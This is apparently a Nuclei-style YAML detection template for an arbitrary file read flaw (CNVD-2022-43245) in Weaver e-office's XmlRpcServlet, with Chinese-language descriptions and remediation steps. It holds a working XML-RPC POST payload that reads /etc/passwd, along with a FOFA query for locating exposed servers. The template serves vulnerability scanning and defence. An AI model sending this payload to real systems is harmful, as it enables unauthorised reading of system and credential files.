id: CNVD-2022-43245

info:
  name: 泛微 e-office XmlRpcServlet 任意文件读取漏洞（CNVD-2022-43245）
  author: SleepingBag945
  severity: high
  description: |
    泛微 e-office 的 XmlRpcServlet 暴露了可读取附件的方法，攻击者可构造 XML-RPC 请求读取服务器本地文件。模板调用 `WorkflowService.getAttachment` 读取 `/etc/passwd`，并通过 XML base64 响应确认漏洞。
  impact: |
    - 攻击者可读取 OA 服务器文件、配置和附件内容，获取数据库连接或系统账号信息。
    - 敏感文件泄露可能进一步导致 OA 后台接管、数据泄露和内网横向移动。
  remediation: |
    - 升级泛微 e-office 至修复版本，限制 XmlRpcServlet 暴露的方法和访问权限。
    - 对 XML-RPC 参数使用文件 ID 与权限校验，禁止任意本地路径读取。
    - 限制该接口访问来源，并排查异常 XML-RPC 调用记录。
  classification:
    cpe: cpe:2.3:a:weaver:e-office:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: weaver
    product: e-office
    fofa-query: app="泛微-协同办公OA"
  tags: cnvd,cnvd2022,weaver,e-office,oa,lfi,vuln

http:
  - raw:
      - |
        POST /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version="1.0" encoding="UTF-8"?><methodCall>
        <methodName>WorkflowService.getAttachment</methodName>
        <params><param><value><string>/etc/passwd</string>
        </value></param></params></methodCall>

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<methodResponse><params><param><value><base64>"

      - type: word
        part: header
        words:
          - "text/xml"

      - type: status
        status:
          - 200
